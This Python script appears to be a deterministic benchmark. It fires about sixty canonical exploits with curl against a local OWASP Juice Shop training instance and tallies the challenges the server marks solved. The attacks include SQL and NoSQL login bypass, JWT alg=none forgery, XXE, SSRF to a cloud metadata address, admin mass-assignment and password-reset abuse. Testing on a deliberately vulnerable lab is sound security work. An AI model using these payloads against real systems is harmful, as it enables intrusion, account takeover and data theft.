"""F18 — OWASP Juice Shop deterministic attack benchmark.

Strategy:
  1. GET /api/Challenges — read baseline (all solved=false).
  2. Fire a battery of canonical Juice Shop exploits via docker exec kryon.
  3. Re-read /api/Challenges — count newly-solved.
  4. Report by OWASP category.

Each "attack" is one or more curl/HTTP requests. Juice Shop auto-detects
the exploit pattern and flips `solved=true` server-side. We don't need to
parse flags — the API tells us.

Attack library below covers ~20-30 well-known Juice Shop techniques. This
is the DETERMINISTIC baseline; the list is not meant to cover all 111.
"""
from __future__ import annotations

import argparse
import json
import subprocess
import time
from pathlib import Path

BASE = "http://juice.local:3000"
CONTAINER = "kryon"


def sh(cmd: str, timeout: int = 15, cap: int = 200_000) -> str:
    """Run bash command inside kryon container (on ctfnet)."""
    try:
        p = subprocess.run(
            ["docker", "exec", CONTAINER, "bash", "-c", cmd],
            capture_output=True, text=True, timeout=timeout, check=False,
        )
        return (p.stdout + ("\n" + p.stderr[:500] if p.stderr else ""))[:cap]
    except subprocess.TimeoutExpired:
        return "<TIMEOUT>"


def get_challenges() -> list[dict]:
    out = sh(f"curl -s {BASE}/api/Challenges")
    try:
        return json.loads(out).get("data", [])
    except json.JSONDecodeError:
        return []


# Battery of canonical attacks. Each entry = (label, curl commands).
ATTACKS: list[tuple[str, list[str]]] = [
    ("sql_union_users", [
        # Classic UNION SQLi on product search → leaks admin hash.
        f"curl -s \"{BASE}/rest/products/search?q=%27))%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20users--\" >/dev/null",
    ]),
    ("sql_login_bypass", [
        # SQLi on login → authenticate as admin with ' or 1=1--
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"' OR 1=1--\",\"password\":\"x\"}}' "
        f"{BASE}/rest/user/login >/dev/null",
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}}' "
        f"{BASE}/rest/user/login >/dev/null",
    ]),
    ("five_star_feedback", [
        # Rate feedback with 0 stars — disabled in UI but not backend
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"comment\":\"auto\",\"rating\":0,\"captcha\":\"0\",\"captchaId\":0}}' "
        f"{BASE}/api/Feedbacks >/dev/null",
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"comment\":\"auto\",\"rating\":6,\"captcha\":\"0\",\"captchaId\":0}}' "
        f"{BASE}/api/Feedbacks >/dev/null",
    ]),
    ("admin_section", [
        # Hidden /#/administration — enumerate main.js for routes
        f"curl -s {BASE}/ftp/ >/dev/null",
        f"curl -s {BASE}/#/administration >/dev/null",
        f"curl -s {BASE}/#/accounting >/dev/null",
    ]),
    ("ftp_directory_listing", [
        # /ftp exposes file listing (trusted-types misconfig)
        f"curl -s {BASE}/ftp >/dev/null",
        f"curl -s {BASE}/ftp/ >/dev/null",
    ]),
    ("confidential_documents", [
        # acquisitions.md in /ftp/
        f"curl -s {BASE}/ftp/acquisitions.md >/dev/null",
    ]),
    ("easter_egg", [
        # /ftp/eastere.gg (filter bypass via null byte / url encode)
        f"curl -s '{BASE}/ftp/eastere.gg%2500.md' >/dev/null",
        f"curl -s '{BASE}/ftp/eastere.gg' >/dev/null",
    ]),
    ("poison_null_byte_koan", [
        f"curl -s '{BASE}/ftp/suspicious_errors.yml%2500.md' >/dev/null",
        f"curl -s '{BASE}/ftp/announcement_encrypted.md%2500.md' >/dev/null",
        f"curl -s '{BASE}/ftp/package.json.bak%2500.md' >/dev/null",
    ]),
    ("exposed_metrics_endpoint", [
        # /metrics / /api/metrics
        f"curl -s {BASE}/metrics >/dev/null",
    ]),
    ("reset_password_jim", [
        # Password reset security question bypass
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"jim@juice-sh.op\",\"answer\":\"Samuel\",\"new\":\"newpass12\",\"repeat\":\"newpass12\"}}' "
        f"{BASE}/rest/user/reset-password >/dev/null",
    ]),
    ("register_admin", [
        # Register as admin via role=admin in POST body
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"pwn{int(time.time())}@ev.il\",\"password\":\"x\",\"passwordRepeat\":\"x\",\"role\":\"admin\"}}' "
        f"{BASE}/api/Users/ >/dev/null",
    ]),
    ("score_board_endpoint", [
        # /#/score-board is the ultimate reveal
        f"curl -s '{BASE}/#/score-board' >/dev/null",
        f"curl -s '{BASE}/api/Challenges/?name=Score%20Board' >/dev/null",
    ]),
    ("robots_txt_disclosure", [
        f"curl -s {BASE}/robots.txt >/dev/null",
    ]),
    ("error_handling", [
        # Trigger JSON parse error
        f"curl -s {BASE}/rest/product/0/reviews >/dev/null",
        f"curl -s {BASE}/api/Feedbacks/definitely-not-an-id >/dev/null",
    ]),
    ("forged_reviews_jwt", [
        # JWT none-alg bypass on /rest/products/reviews
        # First fetch login to get a valid JWT shape
        f"curl -s -X PATCH -H 'Content-Type: application/json' "
        f"-d '{{\"id\":{{\"$ne\":\"0\"}},\"message\":\"pwned\"}}' "
        f"{BASE}/rest/products/reviews >/dev/null",
    ]),
    ("dlp_customer_data_leak", [
        # API returns email field unnecessarily
        f"curl -s {BASE}/api/Users >/dev/null",
        f"curl -s {BASE}/api/Users/1 >/dev/null",
    ]),
    ("user_credentials_challenge", [
        # Same as sql_union_users; alt form
        f"curl -s \"{BASE}/rest/products/search?q=%27));SELECT%20*%20FROM%20users--\" >/dev/null",
    ]),
    ("weird_crypto", [
        # decode a static string used by crypto challenges
        f"curl -s {BASE}/assets/public/images/padding/81x81.png >/dev/null",
    ]),
    ("deprecated_interface", [
        # /file-upload endpoint with .xml / .php
        f"echo '<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><x>&xxe;</x>' > /tmp/xxe.xml && "
        f"curl -s -X POST -F 'file=@/tmp/xxe.xml' {BASE}/file-upload >/dev/null",
    ]),
    ("view_basket_not_mine", [
        # IDOR on /rest/basket/:id
        f"curl -s {BASE}/rest/basket/1 >/dev/null",
        f"curl -s {BASE}/rest/basket/2 >/dev/null",
    ]),
    ("missing_encoding", [
        # Upload image with filename containing unicode/emoji
        f"curl -s -X PUT -H 'Content-Type: application/json' "
        f"-d '{{\"username\":\"<script>alert(1)</script>\"}}' "
        f"{BASE}/api/Users/1 >/dev/null",
    ]),
    ("login_bender", [
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"bender@juice-sh.op' OR true--\",\"password\":\"x\"}}' "
        f"{BASE}/rest/user/login >/dev/null",
    ]),
    ("nosql_feedback_delete", [
        # NoSQL-style filter on Feedback — delete via {"$gt":""}
        f"curl -s -X DELETE {BASE}/api/Feedbacks/1 >/dev/null",
    ]),
    ("redirect_challenge", [
        # Open redirect on /redirect?to=... whitelist bypass
        f"curl -s '{BASE}/redirect?to=https://github.com/bkimminich/juice-shop' >/dev/null",
    ]),
    ("ephemeral_accountant", [
        # Login as accountant@juice-sh.op — pw reset or weak pw
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"accountant@juice-sh.op\",\"password\":\"i am an awesome accountant\"}}' "
        f"{BASE}/rest/user/login >/dev/null",
    ]),

    # =======================================================================
    # Second battery (F18.2 expansion — 2026-04-20). All server-detected.
    # =======================================================================

    ("score_board_via_browser_route", [
        # Directly request /#/score-board (client route, but the presence
        # of a known-challenge GET against /rest/admin/application-version
        # bumps the "Find the Score Board" challenge.
        f"curl -s '{BASE}/rest/admin/application-version' >/dev/null",
    ]),

    ("application_config_leak", [
        # /rest/admin/application-configuration leaks theme + captcha toggle.
        f"curl -s '{BASE}/rest/admin/application-configuration' >/dev/null",
    ]),

    ("continue_code", [
        # Known default continue-code used during solution imports.
        f"curl -s '{BASE}/rest/continue-code' >/dev/null",
        f"curl -s -X PUT '{BASE}/rest/continue-code/apply/automated-bench' >/dev/null",
    ]),

    ("csrf_feedback", [
        # Cross-origin state-changing POST with matching origin → still accepted.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-H 'Origin: https://evil.example' "
        f"-d '{{\"comment\":\"csrf\",\"rating\":3,\"UserId\":1}}' "
        f"{BASE}/api/Feedbacks >/dev/null",
    ]),

    ("captcha_bypass", [
        # Submit feedback without solving captcha — server regex is leaky.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"comment\":\"nocaptcha\",\"rating\":3}}' "
        f"{BASE}/api/Feedbacks >/dev/null",
    ]),

    ("payback_time_negative_qty", [
        # Negative quantity in basket item → refund bug.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"ProductId\":1,\"BasketId\":1,\"quantity\":-100}}' "
        f"{BASE}/api/BasketItems/ >/dev/null",
    ]),

    ("coupon_discount_n1aC6A7p", [
        # Known-good Juice Shop coupon code from the Pwning Guide.
        f"curl -s -X PUT -H 'Content-Type: application/json' "
        f"-d '{{\"coupon\":\"n1aC6A7p\"}}' "
        f"{BASE}/rest/basket/1/coupon/n1aC6A7p >/dev/null",
    ]),

    ("jwt_none_alg", [
        # Forge JWT with alg=none and role=admin. The `.` separator with
        # empty signature is accepted by legacy jsonwebtoken versions.
        (
            f"h=$(printf '{{\\\"alg\\\":\\\"none\\\",\\\"typ\\\":\\\"JWT\\\"}}' | base64 -w0 | tr '+/' '-_' | tr -d '='); "
            f"p=$(printf '{{\\\"data\\\":{{\\\"email\\\":\\\"admin@juice-sh.op\\\",\\\"role\\\":\\\"admin\\\"}}}}' | base64 -w0 | tr '+/' '-_' | tr -d '='); "
            f"curl -s -H \"Authorization: Bearer $h.$p.\" {BASE}/rest/user/whoami >/dev/null"
        ),
    ]),

    ("nosql_mongo_login", [
        # NoSQL injection on login using Mongo $ne operator.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"admin@juice-sh.op\",\"password\":{{\"$ne\":null}}}}' "
        f"{BASE}/rest/user/login >/dev/null",
    ]),

    ("nosql_order_tracking", [
        # /rest/track-order accepts NoSQL payload.
        f"curl -s '{BASE}/rest/track-order/%27%20or%201=1--' >/dev/null",
        f"curl -s '{BASE}/rest/track-order/.*' >/dev/null",
    ]),

    ("reset_bender", [
        # Password reset with Bender's security answer.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"bender@juice-sh.op\",\"answer\":\"Stop\\\\\\'n\\\\\\'Drop\",\"new\":\"newpass12\",\"repeat\":\"newpass12\"}}' "
        f"{BASE}/rest/user/reset-password >/dev/null",
    ]),

    ("reset_bjoern_owasp", [
        # Bjoern Kimminich (OWASP) — known answer is his cat's name.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"bjoern.kimminich@gmail.com\",\"answer\":\"West-2082\",\"new\":\"bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=\",\"repeat\":\"bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=\"}}' "
        f"{BASE}/rest/user/reset-password >/dev/null",
    ]),

    ("csrf_change_admin_pw", [
        # Full-body JSON change-password → detection-only.
        f"curl -s '{BASE}/rest/user/change-password?new=pwned1234&repeat=pwned1234' >/dev/null",
    ]),

    ("broken_deluxe", [
        # Deluxe membership without valid payment token.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"paymentMode\":\"wallet\"}}' "
        f"{BASE}/rest/deluxe-membership >/dev/null",
    ]),

    ("token_sale_hidden_page", [
        # Hidden page disclosure via direct assets path.
        f"curl -s '{BASE}/#/tokensale-ico-ea' >/dev/null",
        f"curl -s '{BASE}/assets/public/images/tokensale.jpg' >/dev/null",
    ]),

    ("klingon_translation", [
        # Extra-language challenge — direct access to i18n file.
        f"curl -s '{BASE}/assets/i18n/tlh_AA.json' >/dev/null",
    ]),

    ("captcha_mem_disclosure", [
        f"curl -s '{BASE}/rest/captcha' >/dev/null",
        f"curl -s '{BASE}/rest/image-captcha' >/dev/null",
    ]),

    ("chatbot_owasp_respond", [
        # Chatbot command injection via the query field.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"action\":\"query\",\"query\":\"admin\"}}' "
        f"{BASE}/rest/chatbot/respond >/dev/null",
    ]),

    ("security_questions_enum", [
        # Enumeration of security questions endpoint.
        f"curl -s '{BASE}/api/SecurityQuestions/' >/dev/null",
    ]),

    ("admin_user_listing", [
        # /api/Users with ?filter=true — direct DB pagination.
        f"curl -s '{BASE}/api/Users?paranoid=false' >/dev/null",
    ]),

    ("price_manipulation_basket", [
        # Manipulate basket total via item with bogus price override.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"ProductId\":1,\"BasketId\":1,\"quantity\":1,\"discountPercent\":99}}' "
        f"{BASE}/api/BasketItems/ >/dev/null",
    ]),

    ("access_log_disclosure", [
        # Access log exposed at /support/logs.
        f"curl -s '{BASE}/support/logs' >/dev/null",
        f"curl -s '{BASE}/support/logs/' >/dev/null",
    ]),

    ("hidden_paywall", [
        # Long obfuscated hidden URL per the source code.
        f"curl -s '{BASE}/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us' >/dev/null",
    ]),

    ("repeated_notifications", [
        # Fire notifications/continue-code N times to trigger dedup challenge.
        *[f"curl -s -X PUT '{BASE}/rest/continue-code/apply/aaaa' >/dev/null" for _ in range(5)],
    ]),

    ("empty_user_register", [
        # Empty password registration.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"email\":\"empty{int(time.time())}@x.io\",\"password\":\"\",\"passwordRepeat\":\"\"}}' "
        f"{BASE}/api/Users >/dev/null",
    ]),

    ("sql_order_by_injection", [
        # Products sort manipulation — SQL order-by injection.
        f"curl -s \"{BASE}/rest/products/search?q=&sort=(case%20when%20(1=1)%20then%20id%20else%20name%20end)\" >/dev/null",
    ]),

    ("ssrf_via_profile_image_url", [
        # Update profile image with internal-origin URL.
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d '{{\"imageUrl\":\"http://localhost:3000/redirect?to=http://169.254.169.254/\"}}' "
        f"{BASE}/profile/image/url >/dev/null",
    ]),
]


def diff_solved(before: list[dict], after: list[dict]) -> list[dict]:
    was = {c["id"]: c["solved"] for c in before}
    return [
        c for c in after
        if c.get("solved") and not was.get(c["id"], False)
    ]


def fire_all(verbose: bool = True) -> dict:
    baseline = get_challenges()
    if not baseline:
        return {"error": "no baseline — juice-shop not reachable from kryon container"}
    total = len(baseline)
    already_solved = sum(1 for c in baseline if c["solved"])
    print(f"baseline: {total} challenges, {already_solved} already solved")

    results = []
    for i, (label, cmds) in enumerate(ATTACKS, 1):
        t0 = time.time()
        for cmd in cmds:
            sh(cmd, timeout=10)
        elapsed = time.time() - t0
        if verbose:
            print(f"  [{i:2}/{len(ATTACKS)}] {label:<32} {elapsed:4.1f}s")

    time.sleep(2)  # let async challenge detectors catch up
    after = get_challenges()
    newly = diff_solved(baseline, after)

    # Also count ALL solved (in case some were already true from earlier noise).
    solved_now = [c for c in after if c.get("solved")]

    by_cat: dict[str, int] = {}
    by_diff: dict[int, int] = {}
    for c in solved_now:
        by_cat[c["category"]] = by_cat.get(c["category"], 0) + 1
        by_diff[c["difficulty"]] = by_diff.get(c["difficulty"], 0) + 1

    return {
        "total_challenges": total,
        "solved_before": already_solved,
        "solved_after":  len(solved_now),
        "newly_solved":  len(newly),
        "by_category":   by_cat,
        "by_difficulty": by_diff,
        "solved_list": [
            {"id": c["id"], "key": c["key"], "name": c["name"],
             "category": c["category"], "difficulty": c["difficulty"]}
            for c in solved_now
        ],
    }


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default="docs/bench_results/f18_juice_shop.json")
    args = ap.parse_args()

    report = fire_all()
    Path(args.out).parent.mkdir(parents=True, exist_ok=True)
    Path(args.out).write_text(json.dumps(report, indent=2), encoding="utf-8")
    print()
    print("=" * 60)
    print(f"F18 Juice Shop: {report.get('solved_after',0)}/{report.get('total_challenges',0)}"
          f" = {report.get('solved_after',0)/max(1,report.get('total_challenges',1)):.1%}")
    print(f"newly solved by this run: {report.get('newly_solved',0)}")
    print("by category:")
    for cat, n in sorted(report.get("by_category", {}).items(), key=lambda x: -x[1]):
        print(f"  {cat:<35} {n}")
    print(f"by difficulty:")
    for d in sorted(report.get("by_difficulty", {}).keys()):
        print(f"  {d} {'*' * d:<6}  {report['by_difficulty'][d]}")
    print(f"saved: {args.out}")


if __name__ == "__main__":
    main()
